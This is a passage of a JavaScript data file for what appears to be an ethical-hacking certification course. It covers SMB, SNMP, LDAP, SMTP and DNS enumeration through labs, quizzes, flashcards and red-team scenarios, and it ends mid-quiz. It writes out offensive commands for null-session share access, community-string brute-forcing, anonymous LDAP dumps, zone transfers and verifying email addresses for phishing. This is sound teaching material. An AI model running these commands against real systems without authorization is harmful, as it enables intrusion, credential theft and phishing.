    {q:'Why is enumerating a list of valid usernames a critical step before attempting a brute-force password attack?',opts:['It encrypts the attack traffic','It ensures you don\'t lock out the Administrator account','If you don\'t have a valid username, your brute-force attack will fail 100% of the time, regardless of the passwords tried','It makes the brute-force attack run faster'],correct:2,fb:'You cannot log in without a valid username. Enumerating the exact usernames used by the organization (e.g., jsmith vs john.smith) is a prerequisite for password attacks.'},
    {q:'If you find port 161 open during a scan, which enumeration tool should you immediately prepare to use?',opts:['smbclient','snmpwalk','sqlmap','dirb'],correct:1,fb:'Port 161 UDP is SNMP (Simple Network Management Protocol). snmpwalk is the tool used to query the SNMP tree to extract device configuration and routing info.'},
    {q:'What type of information does LDAP enumeration typically reveal?',opts:['Website source code','SQL database tables','Active Directory objects, users, organizational units (OUs), and group memberships','Wireless network passwords'],correct:2,fb:'LDAP (Lightweight Directory Access Protocol) on port 389 is the protocol used to query Active Directory. Enumerating it reveals the entire organizational structure.'},
    {q:'Which Nmap feature is heavily used during the Enumeration phase to extract data from services?',opts:['The -sn flag (Ping Sweep)','The -O flag (OS Fingerprinting)','The Nmap Scripting Engine (NSE) scripts (e.g., --script=smb-enum-users)','The -T4 flag (Timing)'],correct:2,fb:'Nmap\'s NSE scripts extend Nmap from a port scanner into a powerful enumeration tool, capable of querying SMB, LDAP, SNMP, and HTTP services for data.'},
    {q:'How can an administrator prevent Null Session enumeration on a Windows network?',opts:['Disable ICMP ping','Block port 80','Configure the RestrictAnonymous registry key to 1 or 2','Install an antivirus program'],correct:2,fb:'Changing the RestrictAnonymous registry key prevents anonymous (Null Session) users from enumerating SAM accounts and shares.'}
  ],
  flashcards:[
    {f:'Enumeration',b:'Actively connecting to target services to extract lists of usernames, machine names, network shares, and configurations.'},
    {f:'Null Session',b:'An unauthenticated (anonymous) connection to a Windows IPC$ share, historically allowing attackers to extract user lists.'},
    {f:'enum4linux',b:'The primary Linux command-line tool for enumerating users, shares, and policies from Windows/SMB systems.'},
    {f:'SMB (Server Message Block)',b:'Port 139/445. Windows file sharing protocol. Prime target for user and share enumeration.'},
    {f:'SNMP (Simple Network Management Protocol)',b:'Port 161 UDP. Used for network monitoring. Often misconfigured with default community strings, revealing routing and device info.'},
    {f:'LDAP',b:'Port 389. Protocol for querying directories (like Active Directory). Reveals users, groups, and OU structure.'},
    {f:'RestrictAnonymous',b:'Windows registry setting used to prevent Null Session enumeration.'},
    {f:'IPC$',b:'Inter-Process Communication share in Windows. The target of Null Session connections.'}
  ],
  ctf:{
    scenario:'You use enum4linux against a Windows Server. The tool successfully establishes a Null Session and enumerates the users. What is the Windows registry key that should have been configured to prevent this anonymous enumeration?',
    hint:'It restricts anonymous access.',
    flag:'CEH{3num3r4t10n_c0nc3pts}',
    points:150
  },
  summary:[
    'Enumeration extracts data (users, shares, networks) needed for exploitation.',
    'It requires an active connection to the specific service.',
    'Null Sessions allow anonymous attackers to extract entire user lists from legacy Windows systems.',
    'enum4linux is the standard tool for SMB/Windows enumeration.',
    'SNMP (port 161) and LDAP (port 389) are major enumeration targets.',
    'User enumeration is a mandatory prerequisite for password cracking or brute-forcing.',
    'Defend against enumeration by disabling anonymous access, using strong authentication, and upgrading legacy protocols.'
  ]
};

CONTENT['netbios-smb'] = {
  module:'Module 04 · Enumeration',
  title:'NetBIOS & SMB Enumeration',
  sub:'Extracting the keys to the Windows kingdom.',
  killchain:{phase:'Scanning & Enumeration',mitre:'T1039 — Data from Network Shared Drive',desc:'SMB (Server Message Block) is the foundation of Windows networking. Enumerating it provides attackers with usernames, password policies, and access to shared files.'},
  learn:{
    simple:'NetBIOS (Network Basic Input/Output System) and SMB (Server Message Block) are the protocols Windows uses to share files and printers. Enumerating them allows attackers to list all users on the domain, view password policies, and find open shared folders containing sensitive data.',
    analogy:'Think of a corporate office. SMB is the file room where everyone stores their documents, and NetBIOS is the name tag on the door. Enumerating SMB is walking into the file room, reading the list of employees allowed inside, and checking which filing cabinets were accidentally left unlocked.',
    why:'Windows networks rely on SMB. If an attacker can enumerate the list of valid Active Directory usernames, they can launch targeted password spraying attacks. If they find an open SMB share containing a backup file or a script with hardcoded credentials, they achieve immediate compromise without needing a complex exploit.',
    architecture:'NetBIOS operates on UDP 137 (Name Service), UDP 138 (Datagram), and TCP 139 (Session). Modern SMB operates directly over TCP 445. Attackers connect to the hidden Inter-Process Communication share (IPC$) to request data from the remote procedure call (RPC) service.'
  },
  diagram:{
    title:'SMB Enumeration Targets',
    steps:[
      {icon:'👥',label:'User & Group Extraction',desc:'Querying the SAM (Security Account Manager) or AD database for all valid usernames and group memberships (e.g., Domain Admins).'},
      {icon:'📂',label:'Share Discovery',desc:'Listing all network shares (C$, ADMIN$, IPC$, UserData). Attackers look for misconfigured shares with read/write access.'},
      {icon:'🔒',label:'Password Policy',desc:'Extracting the domain password policy (e.g., minimum length 8, lockout after 3 attempts). Critical for planning brute-force attacks.'},
      {icon:'🖥️',label:'OS & Architecture',desc:'Identifying the exact Windows version (e.g., Windows Server 2016 Standard) and architecture (x64).'},
      {icon:'🖧️',label:'Active Sessions',desc:'Seeing which users are currently logged into the machine (useful for Pass-the-Hash targeting).'}
    ]
  },
  enterprise:{
    role:'You are an internal penetration tester at GlobalFinSec Corp.',
    situation:'You are on the internal network. You have identified a file server at 10.0.50.20 with port 445 open. You do not have any valid credentials.',
    challenge:'Enumerate the SMB service to find valid usernames, identify the password policy to avoid locking out accounts, and search for exposed file shares.',
    steps:[
      'Check for Null Session: smbclient -L //10.0.50.20 -N (The -N means no password).',
      'Run enum4linux: enum4linux -a 10.0.50.20 to automate the extraction.',
      'Analyze Password Policy: The output shows "Lockout Threshold: 5". This means you can only guess 4 passwords per user before locking their account.',
      'Analyze Users: The output lists 500 valid usernames (e.g., j.doe, a.smith).',
      'Analyze Shares: The output lists a non-default share named "IT_Deployment_Scripts".',
      'Connect to Share: smbclient //10.0.50.20/IT_Deployment_Scripts -N. Download scripts and grep for passwords.'
    ],
    outcome:'The Null Session succeeded because it was a legacy Server 2003 machine. You downloaded a batch script from the open IT share that contained a plaintext Domain Admin password used for automated software installations. You achieved full domain compromise in 15 minutes without running a single exploit.',
    lesson:'Misconfigured SMB shares are the most common source of internal breaches. Disable SMBv1, disable Null Sessions (RestrictAnonymous=1), and audit share permissions regularly. Never store credentials in scripts on network shares.'
  },
  tools:[
    {name:'enum4linux',cmd:'enum4linux -a target_ip',desc:'Automated wrapper for SMB enumeration tools'},
    {name:'smbclient',cmd:'smbclient -L //target_ip -U username',desc:'FTP-like client to access SMB/CIFS resources on servers'},
    {name:'rpcclient',cmd:'rpcclient -U "" target_ip',desc:'Tool for executing client side MS-RPC functions'},
    {name:'nbtstat',cmd:'nbtstat -A target_ip',desc:'Windows native tool for NetBIOS enumeration'},
    {name:'CrackMapExec / NetExec',cmd:'nxc smb target_ip --shares',desc:'Modern, highly powerful post-exploitation and enumeration tool for AD environments'}
  ],
  commands:{
    win:['net view \\192.168.1.100','net share','nbtstat -A 192.168.1.100'],
    lin:['enum4linux -U -S -P 192.168.1.100','smbclient -L //192.168.1.100 -N','nmap --script=smb-os-discovery,smb-enum-shares -p 445 192.168.1.100','rpcclient -U "" -N 192.168.1.100']
  },
  pitfalls:[
    {icon:'⚠️',title:'Ignoring Modern Tools like NetExec (CrackMapExec)',desc:'While enum4linux is classic and taught in CEH, modern penetration testers use NetExec/CrackMapExec for SMB enumeration across entire subnets simultaneously.',fix:'Learn enum4linux for the exam, but learn NetExec (nxc smb 10.0.0.0/24 -u user -p pass --shares) for real-world enterprise assessments.'},
    {icon:'🔴',title:'Brute-Forcing Without Checking the Policy',desc:'Starting a password brute-force attack via SMB without first enumerating the password policy will instantly lock out hundreds of users, causing a massive denial of service.',fix:'Always run enum4linux -P (Password Policy). If lockout is enabled at 3 attempts, you must use a "Password Spray" attack (trying 1 or 2 common passwords across all users) rather than brute-forcing one user.'},
    {icon:'⛔',title:'Assuming Port 139/445 Means "Vulnerable to Exploits"',desc:'Students see port 445 and immediately run MS17-010 (EternalBlue). If the server is patched, they give up.',fix:'An open port 445 is an enumeration opportunity, not just an exploit target. Focus on extracting users, shares, and data even if the system is fully patched.'}
  ],
  lab:{
    title:'Lab: SMB Enumeration & Share Access',
    difficulty:'Intermediate',
    duration:'30 min',
    objectives:['Enumerate shares using smbclient','Use enum4linux to extract users and password policies','Connect to an open share and download a file'],
    steps:[
      'List shares anonymously: smbclient -L //10.10.10.X -N (Replace with practice target IP).',
      'Look for shares without a "$" at the end (e.g., "Backups" instead of "IPC$").',
      'Connect to the open share: smbclient //10.10.10.X/Backups -N',
      'Use FTP-like commands: type "ls" to list files, and "get secret.txt" to download a file.',
      'Run enum4linux -U 10.10.10.X to extract the user list.',
      'Run enum4linux -P 10.10.10.X to view the password lockout policy.'
    ],
    validation:'You should successfully connect to the target\'s SMB share, list the contents, and download a file to your local machine using smbclient.'
  },
  quiz:[
    {q:'Which ports are primarily associated with NetBIOS and SMB enumeration?',opts:['TCP 21, 22, 23','UDP 161, TCP 389','UDP 137, UDP 138, TCP 139, TCP 445','TCP 80, TCP 443'],correct:2,fb:'NetBIOS uses UDP 137 (Name), UDP 138 (Datagram), and TCP 139 (Session). Modern SMB operates directly over TCP 445.'},
    {q:'What is the primary function of the tool enum4linux?',opts:['To emulate a Linux environment on Windows','To automate the extraction of users, shares, password policies, and OS info from Windows and Samba systems','To crack SMB password hashes','To scan for Linux vulnerabilities'],correct:1,fb:'enum4linux is a Perl script that wraps Samba tools (like smbclient and rpcclient) to automate the enumeration of data from Windows and SMB servers.'},
    {q:'What does the command smbclient -L //10.0.0.5 -N accomplish?',opts:['Logs into the server as Administrator','Lists the network shares on the server using a Null Session (no password)','Locks the user accounts on the server','Uploads a payload to the C$ share'],correct:1,fb:'The -L flag lists the shares available on the target. The -N flag tells smbclient to use a Null Session (no password).'},
    {q:'Why is enumerating the Password Policy via SMB critical before launching a password attack?',opts:['To ensure the passwords are encrypted','To find out if the server uses Kerberos','To discover the Account Lockout Threshold to avoid locking out user accounts and causing a Denial of Service','To find the Administrator\'s password'],correct:2,fb:'If the lockout threshold is 5 attempts, and you use Hydra to guess 10 passwords for every user, you will lock out every user in the organization. You must know the policy to stay under the limit.'},
    {q:'What is the IPC$ share?',opts:['Internet Protocol Configuration share','Inter-Process Communication share; a hidden network share used for remote administration and the target for Null Session enumeration','Internal Password Cache share','A share created by malware'],correct:1,fb:'IPC$ (Inter-Process Communication) is a hidden share used by Windows for communication between processes. Attackers connect to it anonymously (Null Session) to request data from the server via RPC.'},
    {q:'Which Windows native command-line tool can be used to view shared resources on a remote computer?',opts:['ipconfig','net view \\target_ip','tracert','ping'],correct:1,fb:'The "net view" command (e.g., net view \\192.168.1.10) lists the shared resources (folders, printers) available on a remote Windows computer.'},
    {q:'What is the difference between a brute-force attack and a password spray attack (often informed by SMB enumeration)?',opts:['Brute-force uses numbers; spraying uses letters','Brute-force tries many passwords against one user; spraying tries one common password against many users to avoid lockout','There is no difference','Spraying is only used for WiFi'],correct:1,fb:'SMB enumeration provides the list of all users. If the lockout policy is strict (e.g., 3 attempts), the attacker "sprays" one likely password (e.g., "Fall2024!") against all 500 enumerated users.'},
    {q:'Which Nmap scripting engine (NSE) script is used to enumerate SMB shares?',opts:['--script=smb-vuln-ms17-010','--script=http-enum','--script=smb-enum-shares','--script=ftp-anon'],correct:2,fb:'The smb-enum-shares script connects to the SMB service and attempts to list all available shares and determine their access permissions (read/write).'},
    {q:'What defensive configuration prevents Null Session enumeration on Windows systems?',opts:['Setting the RestrictAnonymous registry key to 1 or 2','Disabling the Windows Firewall','Enabling SMBv1','Changing the Administrator password'],correct:0,fb:'The RestrictAnonymous registry setting in Windows determines whether anonymous users can enumerate SAM accounts and shares. Setting it to 1 or 2 blocks Null Sessions.'},
    {q:'If you find an open SMB share and want to interact with it from a Linux attacking machine using an FTP-like interface, which tool should you use?',opts:['enum4linux','rpcclient','smbclient','nbtstat'],correct:2,fb:'smbclient provides an FTP-like interface (with commands like ls, cd, get, put) to connect to and interact with Windows/Samba file shares.'}
  ],
  flashcards:[
    {f:'SMB (TCP 445)',b:'Server Message Block. The standard Windows protocol for file and printer sharing.'},
    {f:'NetBIOS (TCP 139)',b:'Network Basic Input/Output System. Older API allowing applications on separate computers to communicate over a LAN.'},
    {f:'enum4linux',b:'The definitive Linux tool for automating SMB enumeration (users, shares, policies).'},
    {f:'smbclient',b:'Linux tool providing an FTP-like interface to connect to SMB shares (e.g., smbclient //ip/share).'},
    {f:'IPC$ Share',b:'Inter-Process Communication. A hidden administrative share. Connecting to it with a Null Session allows enumeration.'},
    {f:'Null Session',b:'Connecting to a Windows share (typically IPC$) with a blank username and blank password ("").'},
    {f:'RestrictAnonymous',b:'Windows Registry key used to disable Null Sessions and prevent anonymous enumeration.'},
    {f:'Password Spraying',b:'Trying 1 or 2 common passwords against a large list of enumerated users to avoid triggering the account lockout policy.'}
  ],
  ctf:{
    scenario:'You use enum4linux against a target and discover an open share containing a file named "passwords.txt". You need to download it to your Kali Linux machine. What command do you use inside the smbclient interactive prompt to download the file?',
    hint:'It is the same command used in FTP to download a file.',
    flag:'CEH{n3tb10s_smb_3num3r8}',
    points:150
  },
  summary:[
    'SMB (TCP 445) and NetBIOS (TCP 139) are the primary targets for Windows enumeration.',
    'Enumeration extracts Usernames, Network Shares, Password Policies, and OS details.',
    'A Null Session (anonymous connection to IPC$) is the historical method for extracting this data.',
    'enum4linux automates the extraction process; smbclient is used to interact with the discovered shares.',
    'Always enumerate the password policy (lockout threshold) before attempting any password attacks.',
    'Password Spraying relies entirely on the list of users extracted during SMB enumeration.',
    'Defend against it by disabling SMBv1, enforcing SMB signing, and setting RestrictAnonymous=1.'
  ]
};

CONTENT['snmp-ldap'] = {
  module:'Module 04 · Enumeration',
  title:'SNMP & LDAP Enumeration',
  sub:'Mapping infrastructure and directory structures.',
  killchain:{phase:'Scanning & Enumeration',mitre:'T1087 — Account Discovery',desc:'SNMP reveals the physical and network topology (routers, switches). LDAP reveals the organizational structure (Active Directory users, groups, and hierarchy).'},
  learn:{
    simple:'SNMP (Simple Network Management Protocol) manages devices like routers, switches, and printers. LDAP (Lightweight Directory Access Protocol) manages directory services like Active Directory. Both protocols, if misconfigured, act as open books, giving attackers complete maps of the network and the organization.',
    analogy:'SNMP is like reading the building\'s plumbing and electrical blueprints; it tells you exactly how the infrastructure is connected. LDAP is like reading the company\'s official org chart and employee directory; it tells you who everyone is, what department they are in, and who has the keys to the vault (Domain Admins).',
    why:'SNMP enumeration provides attackers with routing tables, connected devices, and interface IPs, allowing them to map the network perfectly without noisy scanning. LDAP enumeration provides the entire Active Directory structure, allowing attackers to identify high-value targets (administrators) and their exact locations in the directory.',
    architecture:'SNMP (UDP 161) organizes data in a hierarchical tree called a MIB (Management Information Base). Access is controlled by "Community Strings" (passwords). Version 1 and 2c send strings in plaintext. LDAP (TCP 389) organizes data in a tree (Directory Information Tree) using Distinguished Names (DNs) like CN=John,OU=IT,DC=Company,DC=com.'
  },
  diagram:{
    title:'What SNMP & LDAP Reveal',
    steps:[
      {icon:'🖨️',label:'SNMP: Network Topology',desc:'Routing tables, ARP caches, and interface IP addresses on routers.'},
      {icon:'🖥️',label:'SNMP: Device Info',desc:'System name, location, uptime, running processes, and installed software.'},
      {icon:'👥',label:'LDAP: User Accounts',desc:'Every user in Active Directory, their email, phone number, and description fields (which sometimes contain passwords).'},
      {icon:'🔑',label:'LDAP: Group Memberships',desc:'Identifying exactly who is in the "Domain Admins" or "Enterprise Admins" groups.'},
      {icon:'🏢',label:'LDAP: Organizational Units (OUs)',desc:'Mapping the company structure (e.g., OU=Sales, OU=IT, OU=Servers).'}
    ]
  },
  enterprise:{
    role:'You are a Red Team operator at GlobalFinSec Corp.',
    situation:'You are on the internal network. You found a Cisco router on 10.0.1.1 (port 161 UDP open) and a Windows Domain Controller on 10.0.1.10 (port 389 TCP open).',
    challenge:'Extract the routing tables from the router to find other internal subnets, and extract the list of Domain Admins from the Domain Controller.',
    steps:[
      'SNMP Enumeration: Run onesixtyone to guess the community string of the router. It finds the default string "public" is still enabled.',
      'SNMP Walk: Run snmpwalk -v2c -c public 10.0.1.1. Parse the output for routing tables (ipRouteTable). Discover a hidden management subnet at 192.168.100.0/24.',
      'LDAP Enumeration: Run Nmap LDAP scripts against the DC: nmap -n -sV --script "ldap* and not brute" 10.0.1.10.',
      'LDAP Search: Use ldapsearch to query the directory using an anonymous bind (or a compromised low-priv user): ldapsearch -x -h 10.0.1.10 -b "DC=globalfinsec,DC=local" "(objectClass=User)"'
    ],
    outcome:'The SNMP enumeration revealed a hidden, highly secure management subnet that you were unaware of. The LDAP enumeration provided the exact usernames of the 5 Domain Admins. You are now targeting those 5 users specifically to gain access to the management subnet.',
    lesson:'Default configurations are fatal. SNMPv1/v2c with a "public" community string allows anyone to map the network. Anonymous LDAP binds allow anyone to download the corporate directory.'
  },
  tools:[
    {name:'snmpwalk',cmd:'snmpwalk -v 2c -c public target_ip',desc:'Walks the entire SNMP MIB tree, dumping all available data'},
    {name:'onesixtyone',cmd:'onesixtyone -c dict.txt target_ip',desc:'Extremely fast SNMP community string brute-forcer'},
    {name:'ldapsearch',cmd:'ldapsearch -x -h target_ip -b "dc=example,dc=com"',desc:'Linux command-line utility to query LDAP directories'},
    {name:'BloodHound',cmd:'(GUI Tool / Ingestors)',desc:'Uses LDAP queries to visually map Active Directory privilege relationships (Advanced)'}
  ],
  commands:{
    win:['Rem - Use PowerShell ActiveDirectory module for LDAP, or third-party tools for SNMP'],
    lin:['snmpwalk -v2c -c public 192.168.1.1','snmpcheck -t 192.168.1.1','onesixtyone 192.168.1.1 -c /usr/share/doc/onesixtyone/dict.txt','ldapsearch -x -h 10.0.0.5 -s base namingcontexts']
  },
  pitfalls:[
    {icon:'⚠️',title:'Forgetting SNMP is UDP',desc:'If you run a standard Nmap scan (which is TCP only by default), you will never see port 161 open, and you will miss SNMP enumeration entirely.',fix:'Always run a UDP scan (nmap -sU) on at least the top 100 ports. SNMP is one of the most valuable enumeration targets.'},
    {icon:'🔴',title:'Ignoring SNMP "Write" Strings',desc:'SNMP usually has two community strings: "public" (read-only) and "private" (read-write). If you find the "private" string, you can actually reconfigure the router.',fix:'Always brute-force for both read and write community strings. A compromised "private" string allows you to change routing tables or disable interfaces.'},
    {icon:'⛔',title:'Not Reading the LDAP "Description" Fields',desc:'When dumping LDAP, students often just look at usernames. IT administrators frequently put passwords, locker combinations, or sensitive notes in the "Description" field of user or computer objects.',fix:'Grep the ldapsearch output specifically for the "description" attribute. It is a goldmine of poorly secured information.'}
  ],
  lab:{
    title:'Lab: SNMP Enumeration with snmpwalk',
    difficulty:'Intermediate',
    duration:'20 min',
    objectives:['Understand SNMP community strings','Use onesixtyone to brute-force the string','Use snmpwalk to extract system info'],
    steps:[
      'Identify a target with port 161/UDP open (e.g., Metasploitable).',
      'Brute-force the community string: onesixtyone -c /usr/share/wordlists/snmp.txt [target_ip]',
      'Note the string found (usually "public").',
      'Extract the system information tree: snmpwalk -v2c -c public [target_ip] system',
      'Extract the list of running processes: snmpwalk -v2c -c public [target_ip] hrSWRunName',
      'Observe how much detail SNMP provides without any exploitation.'
    ],
    validation:'You should successfully dump the running processes of the target system using snmpwalk, proving that misconfigured SNMP acts as a massive information leak.'
  },
  quiz:[
    {q:'Which port and protocol does SNMP (Simple Network Management Protocol) primarily use?',opts:['TCP 161','UDP 161','TCP 389','UDP 137'],correct:1,fb:'SNMP operates on UDP port 161. Because it is UDP, it is often missed by standard TCP-only port scans.'},
    {q:'What serves as the "password" for SNMP versions 1 and 2c?',opts:['The IPC$ share','The Distinguished Name (DN)','The Community String','The MIB tree'],correct:2,fb:'SNMPv1 and v2c use Community Strings (typically "public" for read-only and "private" for read/write) to authenticate requests. These are transmitted in plaintext.'},
    {q:'What is a MIB (Management Information Base) in the context of SNMP?',opts:['A tool for cracking passwords','The hierarchical database/tree structure that stores the variables and data SNMP can query on a device','A type of firewall','The master domain controller'],correct:1,fb:'The MIB is the tree-like structure on the device. Tools like snmpwalk "walk" this tree to dump all the data (routing tables, system info, processes) it contains.'},
    {q:'Which tool is specifically designed to quickly brute-force SNMP community strings?',opts:['Hydra','John the Ripper','onesixtyone','enum4linux'],correct:2,fb:'onesixtyone is an extremely fast, lightweight SNMP community string brute-forcer that sends multiple SNMP requests rapidly to identify valid strings.'},
    {q:'What port does LDAP (Lightweight Directory Access Protocol) use by default?',opts:['TCP 445','UDP 161','TCP 389','TCP 3389'],correct:2,fb:'LDAP operates on TCP port 389. Secure LDAP (LDAPS) operates on TCP port 636.'},
    {q:'What kind of information is an attacker primarily looking for when enumerating LDAP?',opts:['Network routing tables','Active Directory objects (users, groups, organizational units, and their attributes)','Website source code','Open firewall ports'],correct:1,fb:'LDAP is the protocol used to query directory services like Microsoft Active Directory. It reveals the entire organizational structure, user list, and group memberships.'},
    {q:'What is an "Anonymous Bind" in LDAP?',opts:['A denial-of-service attack','An encryption method','A misconfiguration that allows an unauthenticated user to query the LDAP directory and extract information','A secure way to authenticate administrators'],correct:2,fb:'If a Domain Controller allows Anonymous Binds, anyone on the network can query LDAP without providing a username or password, extracting the entire Active Directory structure.'},
    {q:'Which Linux command-line tool is used to query LDAP directories?',opts:['smbclient','ldapsearch','snmpwalk','netstat'],correct:1,fb:'ldapsearch is the standard utility for querying LDAP directories. An attacker uses it to execute complex searches against Active Directory to extract user and group data.'},
    {q:'Why is SNMPv3 significantly more secure than SNMPv1 and SNMPv2c?',opts:['It uses TCP instead of UDP','It replaces plaintext Community Strings with proper username/password authentication and encrypts the traffic','It blocks Nmap scans automatically','It can only be accessed from the local console'],correct:1,fb:'SNMPv1 and v2c send community strings and data in plaintext. SNMPv3 introduces cryptographic authentication and payload encryption, making it resistant to sniffing and enumeration.'},
    {q:'In an LDAP hierarchy, what does "OU" stand for?',opts:['Object User','Open Unit','Organizational Unit','Operating Utility'],correct:2,fb:'Organizational Units (OUs) are containers in Active Directory used to organize objects (users, computers) hierarchically (e.g., OU=Sales, OU=IT). Enumerating OUs reveals the company\'s departmental structure.'}
  ],
  flashcards:[
    {f:'SNMP (UDP 161)',b:'Simple Network Management Protocol. Used for monitoring devices. Major enumeration target.'},
    {f:'Community String',b:'The "password" for SNMPv1/v2c. Transmitted in plaintext. Defaults are often "public" (read) and "private" (write).'},
    {f:'MIB (Management Information Base)',b:'The hierarchical database/tree structure that SNMP queries to retrieve device information.'},
    {f:'snmpwalk',b:'Tool used to query an entire SNMP MIB tree, extracting all variables and data from a device.'},
    {f:'onesixtyone',b:'A very fast command-line tool for brute-forcing SNMP community strings.'},
    {f:'LDAP (TCP 389)',b:'Lightweight Directory Access Protocol. Protocol used to query directory services like Microsoft Active Directory.'},
    {f:'Anonymous Bind',b:'A misconfiguration allowing unauthenticated users to query an LDAP directory.'},
    {f:'ldapsearch',b:'Linux command-line utility to construct queries and extract data from LDAP servers.'}
  ],
  ctf:{
    scenario:'You discover port 161 UDP is open on a router. You want to extract its routing tables. You need to use a tool that will traverse the entire MIB tree using the community string "public". What is the name of the tool?',
    hint:'It "walks" the SNMP tree.',
    flag:'CEH{snmp_ld4p_3xp0s3d}',
    points:150
  },
  summary:[
    'SNMP operates on UDP 161. Always include UDP in your scanning phase.',
    'SNMPv1/v2c use plaintext "Community Strings". Defaults ("public") allow attackers to extract routing tables, processes, and device info.',
    'snmpwalk and onesixtyone are the primary SNMP enumeration tools.',
    'LDAP operates on TCP 389 and queries Active Directory.',
    'LDAP enumeration extracts users, groups (Domain Admins), OUs, and descriptions.',
    'Anonymous Binds allow unauthenticated users to dump the entire AD directory.',
    'Upgrade to SNMPv3 (encryption/auth) and disable LDAP Anonymous Binds to secure networks.'
  ]
};

CONTENT['smtp-dns-enum'] = {
  module:'Module 04 · Enumeration',
  title:'SMTP & DNS Enumeration',
  sub:'Extracting valid emails and internal network topologies.',
  killchain:{phase:'Scanning & Enumeration',mitre:'T1590 — Gather Victim Network Information',desc:'SMTP enumeration verifies valid target emails for phishing or brute-forcing. DNS enumeration (like zone transfers) provides the roadmap to the entire network.'},
  learn:{
    simple:'SMTP (Simple Mail Transfer Protocol) is used to send email. Attackers can interact with mail servers to verify if specific email addresses actually exist. DNS enumeration goes beyond footprinting to actively extract bulk infrastructure data, primarily through misconfigured Zone Transfers.',
    analogy:'SMTP enumeration is like calling a company\'s front desk and asking "Does John Smith work here?" to build a directory. DNS Zone Transfer is like asking the front desk for a copy of the company\'s internal phone book and them accidentally handing it to you.',
    why:'Spear-phishing requires valid email addresses. If you send 100 emails to guessed addresses and 90 bounce back, the mail server flags you as spam. SMTP enumeration allows you to silently verify which addresses exist before sending the attack. DNS enumeration prevents you from missing hidden, unlinked servers (like staging or development databases).',
    architecture:'SMTP (TCP 25) supports commands like VRFY (Verify) and EXPN (Expand) which ask the server to confirm a user or expand a mailing list. DNS (TCP/UDP 53) uses AXFR (Zone Transfer) to replicate databases between DNS servers. If AXFR is allowed to any IP, attackers can download the whole database.'
  },
  diagram:{
    title:'SMTP & DNS Enumeration Vectors',
    steps:[
      {icon:'📧',label:'SMTP VRFY Command',desc:'Asks the mail server: "Does user [name] exist?" Server responds with 250 (Yes) or 550 (No).'},
      {icon:'📥',label:'SMTP EXPN Command',desc:'Asks the mail server to expand a mailing list (e.g., "all-staff@company.com"), returning all member email addresses.'},
      {icon:'👥',label:'SMTP RCPT TO',desc:'If VRFY is disabled, attackers start an email and use "RCPT TO:" to test if the server accepts the address.'},
      {icon:'🔄',label:'DNS Zone Transfer (AXFR)',desc:'Requesting a full copy of the DNS zone file, revealing all A records, CNAMEs, and internal hostnames.'},
      {icon:'🗺️',label:'DNS Cache Snooping',desc:'Querying a DNS server to see if a specific record is cached, proving users on that network recently visited that site.'}
    ]
  },
  enterprise:{
    role:'You are preparing a Red Team phishing campaign against GlobalFinSec Corp.',
    situation:'You generated a list of 500 potential employee email addresses using a script (firstname.lastname@globalfinsec.com), but you don\'t know which ones are currently employed. You found their mail server on port 25.',
    challenge:'Enumerate the SMTP server to validate your list of 500 emails, ensuring your phishing campaign has a 100% delivery rate and avoids triggering spam filters with bounced emails.',
    steps:[
      'Connect to the SMTP server: nc globalfinsec-mail.com 25',
      'Test VRFY manually: VRFY jdoe. The server responds "250 2.1.5 jdoe@globalfinsec.com" (User exists).',
      'Automate the list: Use a tool like smtp-user-enum or Nmap (nmap --script=smtp-enum-users).',
      'Run the tool against your list of 500 guessed names: smtp-user-enum -M VRFY -U names.txt -t globalfinsec-mail.com'
    ],
    outcome:'The enumeration revealed that 142 of the 500 guessed emails were valid. You discarded the 358 invalid ones. The phishing campaign was sent to exactly 142 valid inboxes with zero bounced emails, completely bypassing the spam filter\'s anomaly detection.',
    lesson:'SMTP servers should be configured to disable VRFY and EXPN commands, and to provide generic responses to RCPT TO commands. Never give attackers a way to validate their target lists.'
  },
  tools:[
    {name:'smtp-user-enum',cmd:'smtp-user-enum -M VRFY -U users.txt -t 10.0.0.5',desc:'Automates the testing of VRFY, EXPN, and RCPT TO commands'},
    {name:'Nmap NSE',cmd:'nmap --script=smtp-enum-users target',desc:'Nmap script for SMTP enumeration'},
    {name:'dig',cmd:'dig axfr @ns1.target.com target.com',desc:'Command-line tool for DNS queries and Zone Transfers'}
  ],
  commands:{
    win:['nslookup','set type=any','ls -d target.com (attempt zone transfer in nslookup)'],
    lin:['nc -nv 192.168.1.25 25 (then type VRFY root)','dig axfr @ns1.target.com target.com','smtp-user-enum -M RCPT -U users.txt -t 192.168.1.25']
  },
  pitfalls:[
    {icon:'⚠️',title:'Assuming SMTP Enumeration is Dead',desc:'Many modern mail servers (like Exchange or Office 365) disable VRFY by default. Students assume SMTP enumeration no longer works.',fix:'If VRFY and EXPN are disabled, attackers use the "RCPT TO" method. They initiate a fake email (MAIL FROM) and test recipients (RCPT TO). If the server accepts it, the user exists.'},
    {icon:'🔴',title:'Testing Zone Transfers on Only One Name Server',desc:'DNS footprints usually reveal 2-4 Name Servers (NS1, NS2, NS3). Organizations often lock down NS1 but forget to secure the secondary servers.',fix:'Always attempt an AXFR (Zone Transfer) against EVERY authoritative name server listed for the domain. It only takes one misconfigured server to reveal the whole network.'},
    {icon:'⛔',title:'Ignoring Internal DNS Servers',desc:'External DNS zone transfers are rare today. However, once you breach the perimeter, internal Active Directory DNS servers are frequently misconfigured to allow zone transfers to any internal IP.',fix:'DNS enumeration is just as important during the internal Post-Exploitation phase as it is during external Reconnaissance. Always try an AXFR on the internal Domain Controller.'}
  ],
  lab:{
    title:'Lab: Manual SMTP User Verification',
    difficulty:'Beginner',
    duration:'20 min',
    objectives:['Connect to an SMTP server manually','Interact using raw SMTP commands','Verify if a user exists'],
    steps:[
      'Connect to a practice SMTP server (e.g., Metasploitable): nc -nv 10.10.10.X 25',
      'The server should respond with a 220 banner.',
      'Type: HELO attacker.com (and press Enter).',
      'Type: VRFY root (and press Enter). Note the 250 response (User exists).',
      'Type: VRFY fakeuser123 (and press Enter). Note the 550 response (User unknown).',
      'Type: QUIT to exit.'
    ],
    validation:'You should understand how to manually interact with an SMTP server to extract intelligence without sending an actual email.'
  },
  quiz:[
    {q:'Which port does SMTP (Simple Mail Transfer Protocol) operate on by default?',opts:['TCP 21','TCP 25','TCP 110','UDP 161'],correct:1,fb:'SMTP operates on TCP port 25 (unencrypted) or 587/465 (encrypted). Port 110 is POP3.'},
    {q:'Which SMTP command asks the server to confirm if a specific email address or username exists?',opts:['EXPN','HELO','VRFY','RCPT TO'],correct:2,fb:'VRFY (Verify) is explicitly designed to ask the mail server to confirm the existence of a user. It returns a 250 status code if the user exists.'},
